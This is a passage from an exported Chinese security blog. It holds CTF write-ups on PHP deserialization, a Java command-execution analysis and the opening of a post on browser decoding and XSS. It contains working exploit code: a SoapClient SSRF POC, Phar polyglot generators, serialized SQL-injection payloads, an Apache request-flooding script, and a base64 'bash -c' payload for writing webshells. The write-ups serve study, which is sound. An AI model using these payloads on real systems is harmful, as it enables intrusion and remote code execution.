$_SESSION[&apos;flag&apos;] = $flag; }?&gt; flag.php 跟 index.php 之间的微妙联系体现在$_SESSION[&apos;flag&apos;] = $flag;var_dump($_SESSION); $_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;。这里自然想到SSRF。可以利用上文提到的php原生类SoapClient中的__call方法进行SSRF。 构造SSRF的POC (POC来自 @Smi1e) &lt;?php$url = &quot;http://127.0.0.1/flag.php&quot;;$b = new SoapClient(null, array(&apos;uri&apos; =&gt; $url, &apos;location&apos; =&gt; $url));$a = serialize($b);$a = str_replace(&apos;^^&apos;, &quot;\\r\\n&quot;, $a);echo &quot;|&quot; . urlencode($a);?&gt; index.php 中涉及到了call_user_func 函数。PHP手册中 给了几个call_user_func 函数的例子: https://www.php.net/manual/zh/function.call-user-func.php其中需要注意的是当我们的第一个参数为数组时，会把第一个值当作类名，第二个值当作方法进行回调 为了进行反序列化只能利用PHP中SESSION反序列化机制。主要体现在差异性(当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞)。但是在PHP中默认使用的是PHP引擎。所以这里为了展现session的差异性，我们需要通过代码手动构造差异性。 通过 call_user_func($_GET[&apos;f&apos;], $_POST); 构造PHP引擎差异性。并通过 $_SESSION[&apos;name&apos;] = $_GET[&apos;name&apos;]; 将构造的Soap类序列化字符串写入session文件 为了调用 __call 方法。首先利用call_user_func($_GET[&apos;f&apos;], $_POST);传入 f=extract 进行POST变量覆盖。随后通过GET传参令$_SESSION[&apos;name&apos;] = SoapClient。再利用POST传参进行变量b的覆盖。即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。 最后携带cookie访问 Phar拓展攻击面Phar简介拓展攻击面体现在: 可通过构造 phar 在没有 unserailize() 的情况下实现反序列化攻击 由 PHPGGC 理解 PHP 反序列化漏洞 一文中对其概念概括十分简洁明了 简单来说phar就是php压缩文档。它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。 phar结构由 4 部分组成 stub phar 文件标识，格式为 xxx&lt;?php xxx; __HALT_COMPILER();?&gt;； manifest 压缩文件的属性等信息，以序列化存储； contents 压缩文件的内容； signature 签名，放在文件末尾； 这里有两个关键点，一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。 利用条件: phar文件要能够上传到服务器端。 要有可用的魔术方法作为“跳板”。 文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。 生成Phar&lt;?php class TestObject { } @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $o = new TestObject(); $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件 //签名自动计算 $phar-&gt;stopBuffering();?&gt; PS: 要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件 触发条件@secii 师傅文中提到: php一大部分的文件系统函数在通过phar://伪协议解析phar文件时，都会将meta-data进行反序列化 fileatime / filectime / filemtime stat / fileinode / fileowner / filegroup / fileperms file / file_get_contents / readfile / fopen file_exists / is_dir / is_executable / is_file / is_link / is_readable / is_writeable / is_writable parse_ini_file unlink copy 随后 @zsx 师傅blog中 Phar与Stream Wrapper造成PHP RCE的深入挖掘 对其进行了更深入的挖掘 exif exif_thumbnail exif_imagetype gd imageloadfont imagecreatefrom*** hash hash_hmac_file hash_file hash_update_file md5_file sha1_file file / url get_meta_tags get_headers standard getimagesize getimagesizefromstring zip$zip = new ZipArchive();$res = $zip-&gt;open(&apos;c.zip&apos;);$zip-&gt;extractTo(&apos;phar://test.phar/test&apos;); Bzip / Gzip如果限制了phar://不能出现在头几个字符。可用 compress.bzip2:// 和 compress.zlib:// 添加至 phar:// 前面进行 bypass$z = &apos;compress.bzip2://phar:///home/sx/test.phar/test.txt&apos;; MySQLLOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper&lt;?phpclass A { public $s = &apos;&apos;; public function __wakeup () { system($this-&gt;s); }}$m = mysqli_init();mysqli_options($m, MYSQLI_OPT_LOCAL_INFILE, true);$s = mysqli_real_connect($m, &apos;localhost&apos;, &apos;root&apos;, &apos;123456&apos;, &apos;easyweb&apos;, 3306);$p = mysqli_query($m, &apos;LOAD DATA LOCAL INFILE \\&apos;phar://test.phar/test\\&apos; INTO TABLE a LINES TERMINATED BY \\&apos;\\r\\n\\&apos; IGNORE 1 LINES;&apos;); HITCON 2016 babytrick网上没找到题目复现的docker环境，所以直接去 Github 上找的源码，对题目理解可能有失偏颇，敬请谅解。 题目代码如下 &lt;?phpinclude &quot;config.php&quot;;class HITCON{ private $method; private $args; private $conn; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; $this-&gt;__conn(); } function show() { list($username) = func_get_args(); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos;&quot;, $username); $obj = $this-&gt;__query($sql); if ( $obj != false ) { $this-&gt;__die( sprintf(&quot;%s is %s&quot;, $obj-&gt;username, $obj-&gt;role) ); } else { $this-&gt;__die(&quot;Nobody Nobody But You!&quot;); } } function login() { global $FLAG; list($username, $password) = func_get_args(); $username = strtolower(trim(mysql_escape_string($username))); $password = strtolower(trim(mysql_escape_string($password))); $sql = sprintf(&quot;SELECT * FROM users WHERE username=&apos;%s&apos; AND password=&apos;%s&apos;&quot;, $username, $password); if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) { $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;); } $obj = $this-&gt;__query($sql); if ( $obj != false &amp;&amp; $obj-&gt;role == &apos;admin&apos; ) { $this-&gt;__die(&quot;Hi, Orange! Here is your flag: &quot; . $FLAG); } else { $this-&gt;__die(&quot;Admin only!&quot;); } } function source() { highlight_file(__FILE__); } function __conn() { global $db_host, $db_name, $db_user, $db_pass, $DEBUG; if (!$this-&gt;conn) $this-&gt;conn = mysql_connect($db_host, $db_user, $db_pass); mysql_select_db($db_name, $this-&gt;conn); if ($DEBUG) { $sql = &quot;CREATE TABLE IF NOT EXISTS users ( username VARCHAR(64), password VARCHAR(64), role VARCHAR(64) ) CHARACTER SET utf8&quot;; $this-&gt;__query($sql, $back=false); $sql = &quot;INSERT INTO users VALUES (&apos;orange&apos;, &apos;$db_pass&apos;, &apos;admin&apos;), (&apos;phddaa&apos;, &apos;ddaa&apos;, &apos;user&apos;)&quot;; $this-&gt;__query($sql, $back=false); } mysql_query(&quot;SET names utf8&quot;); mysql_query(&quot;SET sql_mode = &apos;strict_all_tables&apos;&quot;); } function __query($sql, $back=true) { $result = @mysql_query($sql); if ($back) { return @mysql_fetch_object($result); } } function __die($msg) { $this-&gt;__close(); header(&quot;Content-Type: application/json&quot;); die( json_encode( array(&quot;msg&quot;=&gt; $msg) ) ); } function __close() { mysql_close($this-&gt;conn); } function __destruct() { $this-&gt;__conn(); if (in_array($this-&gt;method, array(&quot;show&quot;, &quot;login&quot;, &quot;source&quot;))) { @call_user_func_array(array($this, $this-&gt;method), $this-&gt;args); } else { $this-&gt;__die(&quot;What do you do?&quot;); } $this-&gt;__close(); } function __wakeup() { foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); } }}if(isset($_GET[&quot;data&quot;])) { @unserialize($_GET[&quot;data&quot;]); } else { new HITCON(&quot;source&quot;, array());} 漏洞代码核心: @unserialize($_GET[&quot;data&quot;]); 代码的全局过滤如下，主要过滤函数为 mysql_escape_string function __wakeup() { foreach($this-&gt;args as $k =&gt; $v) { $this-&gt;args[$k] = strtolower(trim(mysql_escape_string($v))); }} 关于此魔术方法的绕过为 CVE-2016-7124 代码中参数附值主要靠 call_user_func_array(),list(),func_get_args()三个函数共同作用。 首先 show 方法中动态拼接sql语句采取了 sprintf 函数。但其对单引号等敏感字符并没有转义功能，又因为我们可利用CVE-2016-7124 来绕过全局过滤。因此此处存在sql注入。 通过sql注入获得orange密码 &lt;?phpclass HITCON{ private $method=&quot;show&quot;; private $args=array(&quot;&apos; union select password,1,1 from users where username = &apos;orange&apos;#&quot;); private $conn=1;}$payload1 = new HITCON();echo urlencode(serialize($payload1));?&gt; 通过上述步骤得知 orange 的密码是 babytrick1234 接着进入 login 方法，这里通过用户名跟密码可以得到 flag。但其方法里一处限制如下 if ( $username == &apos;orange&apos; || stripos($sql, &apos;orange&apos;) != false ) { $this-&gt;__die(&quot;Orange is so shy. He do not want to see you.&quot;);} Bypass的点为 mysql的编码设置安全 猪猪侠在微博上曾经说过 MYSQL 中 utf8_unicode_ci和utf8_general_ci两种编码格式,utf8_general_ci不区分大小写,Ä = A, Ö = O, Ü = U这三种条件都成立,对于utf8_general_ci下面的等式成立：ß=s,但是，对于utf8_unicode_ci下面等式才成立：ß = ss 本地使用 DVWA 的库进行测试 因此通过替换关键字符，构造最终payload如下 &lt;?phpclass HITCON{ private $method; private $args; private $conn; public function __construct($method, $args) { $this-&gt;method = $method; $this-&gt;args = $args; }}$args[&apos;username&apos;] = &apos;ORÄNGE&apos;;$args[&apos;password&apos;] = &apos;babytrick1234&apos;;$data = new HITCON(&apos;login&apos;,$args);echo urlencode(serialize($data));?&gt; HITCON 2017 Baby-Master-PHP题目采用 i春秋 平台进行复现。其实本来最开始复现采用的是buu，但是buu的平台加载不了我服务器上的phar文件。后来就换了 题目源码 &lt;?php$FLAG = create_function(&quot;&quot;, &apos;die(`/read_flag`);&apos;);$SECRET = `/read_secret`;$SANDBOX = &quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);@mkdir($SANDBOX);@chdir($SANDBOX);if (!isset($_COOKIE[&quot;session-data&quot;])) { $data = serialize(new User($SANDBOX)); $hmac = hash_hmac(&quot;sha1&quot;, $data, $SECRET); setcookie(&quot;session-data&quot;, sprintf(&quot;%s-----%s&quot;, $data, $hmac));}class User { public $avatar; function __construct($path) { $this-&gt;avatar = $path; }}class Admin extends User { function __destruct() { $random = bin2hex(openssl_random_pseudo_bytes(32)); eval(&quot;function my_function_$random() {&quot; . &quot; global \\$FLAG; \\$FLAG();&quot; . &quot;}&quot;); $_GET[&quot;lucky&quot;](); }}function check_session() { global $SECRET; $data = $_COOKIE[&quot;session-data&quot;]; list($data, $hmac) = explode(&quot;-----&quot;, $data, 2); if (!isset($data, $hmac) || !is_string($data) || !is_string($hmac)) { die(&quot;Bye&quot;); } if (!hash_equals(hash_hmac(&quot;sha1&quot;, $data, $SECRET), $hmac)) { die(&quot;Bye Bye&quot;); } $data = unserialize($data); if (!isset($data-&gt;avatar)) { die(&quot;Bye Bye Bye&quot;); } return $data-&gt;avatar;}function upload($path) { $data = file_get_contents($_GET[&quot;url&quot;] . &quot;/avatar.gif&quot;); if (substr($data, 0, 6) !== &quot;GIF89a&quot;) { die(&quot;Fuck off&quot;); } file_put_contents($path . &quot;/avatar.gif&quot;, $data); die(&quot;Upload OK&quot;);}function show($path) { if (!file_exists($path . &quot;/avatar.gif&quot;)) { $path = &quot;/var/www/html&quot;; } header(&quot;Content-Type: image/gif&quot;); die(file_get_contents($path . &quot;/avatar.gif&quot;));}$mode = $_GET[&quot;m&quot;];if ($mode == &quot;upload&quot;) { upload(check_session());} else if ($mode == &quot;show&quot;) { show(check_session());} else { echo &quot;IP:&quot;.$_SERVER[&quot;REMOTE_ADDR&quot;]; echo &quot;Sandbox:&quot;.&quot;/var/www/data/&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]); highlight_file(__FILE__);} 上来第一行就是一个姿势点orz$FLAG = create_function(&quot;&quot;, &apos;die(/read_flag);&apos;);。根据php源码 匿名函数会被设置为\\x00lambda_%d ，其中 %d 为数字，取决于进程中匿名函数的个数，但是我们每访问一次题目，就会生成一个匿名函数，这样匿名函数的名字就不可控。这里需要参考: Apache 工作的三种模式：Prefork、Worker、Event可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了。 Apache-prefork模型(默认模型)在接受请求后会如何处理,首先Apache会默认生成5个child server去等待用户连接, 默认最高可生成256个child server, 这时候如果用户大量请求, Apache就会在处理完MaxRequestsPerChild个tcp连接后kill掉这个进程,开启一个新进程处理请求。 随后代码初始化了用户沙箱。 题目中干扰最大的是check_session 函数。check_session 函数中具有反序列化的功能，但是 hash_equals 函数进行了数据校验，而 $SECRET 的值不可知。因此无法利用这点进行反序列化构造我们的payload 然后代码有两个类User、Admin。其分别是父类与子类。admin类中存在敏感函数eval。然后是一个 $_GET[&quot;lucky&quot;](); 这样的动态调用。 后面主要实现了两个功能，一个是写入一个文件，一个是返回文件路径。且对文件前几个字符进行了 GIF89a 的限制 之前是0day，现在已经有很多文章都分析过 phar 拓展反序列化的原理。 upload函数中 file_get_contents 这类文件相关操作会触发 phar，从而进行反序列化。 poc.php &lt;?phpclass Admin { public $avatar = &apos;orz&apos;; } $p = new Phar(__DIR__ . &apos;/avatar.phar&apos;, 0);$p[&apos;file.php&apos;] = &apos;&lt;?php ?&gt;&apos;;$p-&gt;setMetadata(new Admin());$p-&gt;setStub(&apos;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&apos;);rename(__DIR__ . &apos;/avatar.phar&apos;, __DIR__ . &apos;/avatar.gif&apos;);?&gt; 接着，我们需要通过大量请求，使 apache 重新开启一个新的线程 贴上 @orange 师傅的脚本 import requestsimport socketimport timefrom multiprocessing.dummy import Pool as ThreadPooltry: requests.packages.urllib3.disable_warnings()except: passdef run(i): while 1: HOST = &apos;x.x.x.x&apos; PORT = xx s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((HOST, PORT)) s.sendall(&apos;GET /avatar.gif HTTP/1.1\\nHost: yourip\\nConnection: Keep-Alive\\n\\n&apos;) # s.close() print &apos;ok&apos; time.sleep(0.5)i = 8pool = ThreadPool( i )result = pool.map_async( run, range(i) ).get(0xffff) 加载我们服务器上的phar文件http://117.50.3.97:8005/index.php?m=upload&amp;url=http://ip&apos; 利用脚本发出大量请求，使 apache 重新开启一个新的线程 最后访问http://117.50.3.97:8005/index.php?m=upload&amp;url=phar:///var/www/data/xxx/&amp;lucky=%00lambda_1 referhttps://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html#_label2_1https://coomrade.github.io/2018/10/26/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E9%9D%A2%E6%8B%93%E5%B1%95%E6%8F%90%E9%AB%98%E7%AF%87/https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/https://blog.zsxsoft.com/post/38","link":"/2020/02/18/%E5%86%8D%E8%B0%88PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"浅析 Java 命令执行","text":"对 Java 命令执行过程中的流程以及利用坑点进行学习分析 PrefaceJava 的大多数攻击的最后调用都在命令执行这个地方，而命令执行涉及的方方面面还是大有可深究 本文从以下几个维度分析 Java 命令执行 How to Command execution How to getshell How to Command execution首先谈一下 Java 当中究竟有哪些方式可以进行命令执行 java.lang.Runtime#exec() java.lang.ProcessBuilder#start() java.lang.ProcessImpl#start() 更多（如 JNI 调用动态链接库、Unsafe 类、defineClass() 等，不在本文探讨范围） java.lang.Runtime#exec()先看一下源码 首先 java.lang.Runtime 是一个单例模式，它不能被实例化，只能通过 getRuntime 获得对象，具体可参考: 单例模式 看一个最简单的命令执行的例子 package exec;import java.io.IOException;public class ExecDemo00 { public static void main(String[] args) throws IOException { Process procdemo = Runtime.getRuntime().exec(&quot;open -a calculator&quot;); }} 成功弹出了计算器，那么其实在命令执行的更多利用方式上，光弹一个计算器是不够的 因为我们在很多场景下需要其回显功能 由此一般的命令执行代码如下； package exec;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class ExecDemo01 { public static void main(String[] args) throws IOException { /** * 获取 Process 类 */ Process procexec = Runtime.getRuntime().exec(&quot;whoami&quot;); /** * 获取输入流、子进程标准输出 */ InputStream ins = procexec.getInputStream(); /** * 创建 ByteArrayOutputStream 缓冲区 */ ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] bytes = new byte[1024]; int size; /** * ins.read(bytes) 从输入流中读取一定数量的字节，并将其存储到缓冲区数组中 bytes * 返回值：读入缓冲区的总字节数，或者 -1 由于到达流的末尾而没有更多数据。 */ while ((size = ins.read(bytes)) &gt; 0 ){ /** * 将 size 指定字节数组中从偏移量开始的字节写入此数组输出流 */ bos.write(bytes, 0, size); } /** * 通过解码字节将缓冲区内容转换为字符串。 */ System.out.println(bos.toString()); }} 那么为什么上述代码能够获取回显呢？ 先回顾一下 Runtime.exec() 的作用。其实命令执行只是我们对结果的一个统称。那么它其实真正的作用是： 创建一个本地进程，并返回Process子类的一个实例，该实例可用来控制进程并获取相关信息。 对比一下之前的例子，我们发现其实关键出现在 getInputStream 这里 那么我们发现其实 getInputStream是 Process 类的API 之后创建 ByteArrayOutputStream 然后转换出来即可 网上很多文章说这里的getInputStream 的作用就只说了一个获取输入流，之前很困惑为什么获取输入流可以获取命令执行的结果，不太理解输入流跟命令执行输出的关系，后来看了下官方文档，发现官方文档的返回值写的很清楚大概这里的输入流不是字面意思上的理解的那种，反正会获取子流程正常输出内容就对了 看一下官方的定义 getInputStream public abstract InputStream getInputStream() Returns the input stream connected to the normal output of the subprocess. The stream obtains data piped from the standard output of the process represented by this Process object. If the standard output of the subprocess has been redirected using ProcessBuilder.redirectOutput then this method will return a null input stream. Otherwise, if the standard error of the subprocess has been redirected using ProcessBuilder.redirectErrorStream then the input stream returned by this method will receive the merged standard output and the standard error of the subprocess. Implementation note: It is a good idea for the returned input stream to be buffered. Returns: the input stream connected to the normal output of the subprocess 那么联想到 Weblogic 2725 的获取回显的思路也是在 Weblogic中获取到当前线程类，然后定位到输出类，最后获取的回显信息。 java.lang.ProcessBuilder#start() ProcessBuilder是一个final类，Process是一个抽象类。ProcessBuilder.start() 和 Runtime.exec() 方法都被用来创建一个操作系统进程（执行命令行操作），并返回 Process 子类的一个实例，该实例可用来控制进程状态并获得相关信息。 ProcessBuilder.start() 只支持字符串数组参数，且 第一个参数必须是可执行程序，可以添加参数使用{&quot;cmd&quot;, &quot;/c&quot;} 或 {&quot;/bin/bash&quot;, &quot;-c&quot;} package exec;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;public class ExecDemo02 { public static void main(String[] args) throws IOException { String[] cmds = {&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;whoami&quot;}; Process procexec = new ProcessBuilder(cmds).start(); InputStream ins = procexec.getInputStream(); ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] bytes = new byte[1024]; int size; while ((size = ins.read(bytes)) &gt; 0 ){ bos.write(bytes, 0, size); } System.out.println(bos.toString()); }} java.lang.ProcessImpl通过之前的图我们也可以知道 java.lang.ProcessImpl 是更为底层的实现。 特点是不能直接调用，需要通过反射去间接调用 package exec;import java.io.ByteArrayOutputStream;import java.io.IOException;import java.io.InputStream;import java.lang.reflect.InvocationTargetException;import java.lang.reflect.Method;import java.util.Map;public class ExecDemo03 { public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException { String[] cmds = {&quot;whoami&quot;}; Class clz = Class.forName(&quot;java.lang.ProcessImpl&quot;); Method method = clz.getDeclaredMethod(&quot;start&quot;, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class); method.setAccessible(true); Process procexec = (Process) method.invoke(null,cmds, null, &quot;.&quot;, null, true); InputStream ins = procexec.getInputStream(); ByteArrayOutputStream bos = new ByteArrayOutputStream(); byte[] bytes = new byte[1024]; int size; while ((size = ins.read(bytes)) &gt; 0 ){ bos.write(bytes, 0, size); } System.out.println(bos.toString()); }} How to getshell by java.lang.Runtime#exec()getshelljava.lang.Runtime#exec() 作为 Java 里最常见进行命令执行的方法。我们下文探究如何通过其进行 getshell wget 或者 curl 下载文件 echo 写入webshell String[] cmdarray String command + base64encode wget and curl 优势 操作便捷 可以下载可执行文件 缺陷 受限于网络环境 wget Runtime.getRuntime().exec(&quot;wget https://p2hm1n.com/images/logo.png&quot;); curl Runtime.getRuntime().exec(&quot;curl -O https://p2hm1n.com/images/logo.png&quot;); String[] cmdarray 优势 相比于 wget / curl 不受限于网络环境 缺陷 兼容性较差，比如有的系统固定命令执行方式 前提：getshell的过程中需要写入 webshell，而写入 Webshell 的命令形如 echo &quot;flag&quot; &gt; flag.txt 但是利用 java.lang.Runtime#exec(String command) 直接执行无法写入文件 Runtime.getRuntime().exec(&quot;echo \\&quot;flag\\&quot; &gt; flag.txt&quot;); 如果想写入文件的话，需要使用如下命令 // linuxRuntime.getRuntime().exec(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo \\&quot;flag\\&quot; &gt; flag.txt&quot;});// windowsRuntime.getRuntime().exec(new String[]{&quot;cmd&quot;, &quot;/c&quot;, &quot;echo \\&quot;flag\\&quot; &gt; flag.txt&quot;}); 究其原因 java.lang.Runtime 中其实有 6 个 exec 的重载方法 查了下官方文档，大概如下： /** * 在单独的进程中执行指定的字符串命令 */public Process exec(String command) throws IOException/** * 在具有指定环境的单独进程中执行指定的字符串命令 */public Process exec(String command, String[] envp) throws IOException/** * 在具有指定环境和工作目录的单独进程中执行指定的字符串命令 */public Process exec(String command, String[] envp, File dir) throws IOException/** * 在单独的进程中执行指定的命令和参数。 */public Process exec(String[] cmdarray) throws IOException/** * 在具有指定环境的单独进程中执行指定的命令和参数 */public Process exec(String[] cmdarray, String[] envp) throws IOException/** * 在具有指定环境和工作目录的单独进程中执行指定的命令和参数 */public Process exec(String[] cmdarray, String[] envp, File dir) throws IOException 下面进行命令执行解析流程分析： 首先分析 Runtime.getRuntime().exec(&quot;echo \\&quot;flag\\&quot; &gt; flag.txt&quot;); 首先将命令完全传给了 command 参数，返回值形如 exec(command, null, null); 这一步传入的参数为 command，跟进分析 经过如下处理： java.util.StringTokenizer#StringTokenizer(java.lang.String)-&gt; java.util.StringTokenizer#StringTokenizer(java.lang.String, java.lang.String, boolean) -&gt; java.util.StringTokenizer#setMaxDelimCodePoint-&gt;java.util.StringTokenizer#countTokens 最后转换成了 cmdarray。将原本传入的参数值进行了切割，转换成了数组，最后再次调用 exec 重载方法 调用到 java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File)。后续调用 java.lang.ProcessBuilder#start 来进行命令执行 知识点一： java.lang.Runtime 中 6个 exec 的重载方法根据参数不同进行区分，主要是传入字符串跟数组两种形式，但最终调用都在java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File) 这里，该函数内部首先调用ProcessBuilder类的构造函数创建ProcessBuilder对象，然后调用start()，最终返回一个Process对象。 知识点二： Runtime#exec()底层还是调用的ProcessBuilder#start()，且传入构造函数的参数要求是数组类型。所以传给Runtime#exec()的命令字符串需要先使用StringTokenizer类分割为数组再传入ProcessBuilder类 这里同时解释了命令执行的底层关系，以及解释了 ProcessBuilder#start() 传入参数值的问题。但似乎还没有解决我们之前遗留的写入 webshell 的问题。 到这里先暂停一下。因为我们知道 Runtime#exec()底层还是调用的 ProcessBuilder#start()。所以我们的变量控制的范围应该在这里先停下。 因为我们得知道 ProcessBuilder#start() 需要什么样的命令格式，我们才能去控制 Runtime#exec 的参数去调整，又因为 ProcessBuilder#start() 最后会调用到 ProcessImpl.start() 我们看一下以下三种情况传入到 ProcessImpl.start() 的状态 Runtime.getRuntime().exec(&quot;echo echo flag &gt; flag.txt&quot;); Runtime.getRuntime().exec(&quot;/bin/sh -c echo flag &gt; flag.txt&quot;); Runtime.getRuntime().exec(new String[]{&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo flag &gt; flag.txt&quot;}); 着重看第三种方法 这里可以发现是直接 return 到 java.lang.Runtime#exec(java.lang.String[], java.lang.String[], java.io.File) 的 然后直接进行后面的调用 划重点：不会经过 StringTokenizer 进行字符串处理 经过实验我们知道只有 第三种 是可以输出到一个文件的，究其核心原因在于 StringTokenizer 对字符串的分割破坏了原有的语义，而直接传入数组类型字符串则由自己分割字符串 而第一种不能直接执行的原因是因为 Linux 下执行命令前面需要加上 /bin/sh -c，详见后面分析。 回到我们的分析，之前的分析已经调用到 ProcessImpl.start() 了 java.lang.Process 里这里有一个操作： 取出 cmdarray[0] 赋值给prog,如果安全管理器 SecurityManager 开启,会调用SecurityManager#checkExec()对执行程序prog进行检查 跟据注释可以看到这段代码的用途 ： Throws IndexOutOfBoundsException if command is empty 随后返回一个 new UNIXProcess() 针对第一个参数的处理在 java.lang.ProcessImpl#toCString 针对除第一个参数之外的处理在之前就已经完成 之后调用到 java.lang.UNIXProcess#UNIXProcess 这里还会调用 forkAndExec 方法，这个方法是一个 native 方法（会调用 C 语言之类的） 看一下此时的参数分割 在开发者的眼中prog是要执行的命令, argBlock都是传给 prog 的参数。 可见经过 StringTokenizer 对字符串中空格类的处理其实是一种java对命令执行的保护机制，他可以防御以下这种命令注入 &gt;String cmd = &quot;echo &quot; + 可控点;&gt;Runtime.getRuntime().exec(cmd) 题外话：站在开发的角度来看这也确实是 Java 相比 PHP 在防止命令注入的场景天然的优势了 启动了一个 sh 进程 那第二种为什么不行呢，看一下第二种的参数分割。 依照我的理解：既然 argBlock 是传递给 prog 的参数，所以当 echo 后面的东西分快传播就会破坏原来的语义，因此不能正常解析 （我也不知道这样理解对不对 ） 这样虽然也能启一个sh进程，但由于不能正常解析，所以不会写入文件 而第一个方法显然不能启动一个 sh 进程，因此在 Linux 下第一个传入的参数需要为 /bin/sh，所以第一种不行。 关于 Windows 的分析可以参考 360BugCloud 的《浅析Java命令执行》： 需要添加cmd /c的原因: 在传入 echo_test &gt; echo.txt 命令字符串时，出现错误(“java.io.IOException: Cannot run program “echo”: CreateProcess error=2, 系统找不到指定的文件。”)。原因是echo为命令行解释器cmd.exe的内置命令，并不是一个单独可执行的程序(如下图)，所以如果想执行echo命令写文件需要先启动cmd.exe，然后将echo命令做为cmd.exe的参数进行执行。 另外关于cmd下的 /c 参数，当未指定时,运行如下示例程序,系统会启动一个pid为8984的cmd后台进程，由于cmd进程未终止导致java程序卡死。当指定/c时，cmd进程会在命令执行完毕后成功终止。 所以在Windows环境下，使用Runtime.getRuntime()执行的命令前缀需要加上cmd /c，使得底层Windows的processthreadsapi.h#CreateProcessW()方法在创建新进程时，可以正确识别cmd且成功返回命令执行结果。 String command + base64encode 优势 适用于字符串命令传参 缺点 无 字符串命令传参的情况下可以通过 @jackson 这个国外研究员的方式解决：http://www.jackson-t.ca/runtime-exec-payloads.html Process procdemo = Runtime.getRuntime().exec(&quot;bash -c {echo,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d}|{bash,-i}&quot;); 下面进行简单的分析 这里可以看到因为没有空格的原因，即使经过 StringTokenizer 处理，依然只分割成了三个参数 最后传入 java.lang.UNIXProcess#forkAndExec 时也是如我们所期望的那样 那么这个payload的构造有什么巧妙？ bash -c {echo,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d}|{bash,-i} 我们对这个 payload 进行从左至右的分析 首先 bash -c 同我们之前分析所用的 /bin/sh -c 是一样的道理，只不过调用的环境不一样 接着我们分析 {echo,ZWNobyBmbGFnID4gZmxhZy50eHQ=}|{base64,-d} 其实就是 大括号 + 管道符 的利用，核心目的是为了绕过空格的限制从而避免被 StringTokenizer 处理 接着分析 echo flag &gt; flag.txt|{bash,-i} bash -i 常见用于反弹shell中，其核心是 -i 这个参数表示的是产生交互式的shell 再延伸一下思路： 经过上面的分析其实我们知道核心思路就是一个 bypass 符号的问题 我们的目的也就是用 shell 能识别但是不会被 StringTokenizer 切割的 想想 CTF 中最常见的 bypass 空格的方式 ${IFS} Process procdemo = Runtime.getRuntime().exec(&quot;bash echo${IFS}flag&gt;flag.txt&quot;); 根据最后传参格式来看是可以执行的 但是本地为 MacOS 环境，无法测试最终结果 End在后面调试的 ProcessBuilder#start() 过程中看到了 @李三 师傅的文章：https://xz.aliyun.com/t/7046 以及 @threedr3am 师傅的评论。 写的太细了，本来我已经没有任何补充空间了，但是还是重新写了一遍，我觉得写点东西才能沉淀下来 REF： https://xz.aliyun.com/t/7046 https://www.anquanke.com/post/id/221159 https://mp.weixin.qq.com/s/pzpc44-xH932M4eCJ8LxYg","link":"/2021/01/04/%E6%B5%85%E6%9E%90-Java-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"title":"浏览器解析机制与渲染过程","text":"浏览器编解码与XSS bypass 序章论一张图打败你学 XSS 的信心。（转自微博 附上 MDN DOM 事件参考: https://developer.mozilla.org/zh-CN/docs/Web/Events 本文参考多篇文章，涉及相关晦涩难懂名词解释，术语解释。均是 CTRL c v 。属于只可意会不可言传的领域。其他的知识都会尽量经我口中阐述的简单一点。 浏览器的解码浏览器的解码规则 HTML解析器对HTML文档进行解析完成HTML解码并且创建DOM树 javascript 或者 CSS解析器对内联脚本进行解析，完成JS CSS解码 URL解码会根据URL所在的顺序不同而在JS解码前或者解码后 